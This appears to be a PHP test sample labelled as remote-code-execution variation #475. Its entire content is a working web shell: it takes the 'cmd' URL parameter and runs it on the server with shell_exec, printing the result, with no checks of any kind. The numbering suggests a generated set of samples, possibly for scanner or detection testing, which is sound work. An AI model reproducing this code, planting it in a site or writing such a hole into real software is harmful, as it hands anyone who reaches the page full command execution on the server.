<?php
// RCE test variation #475
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>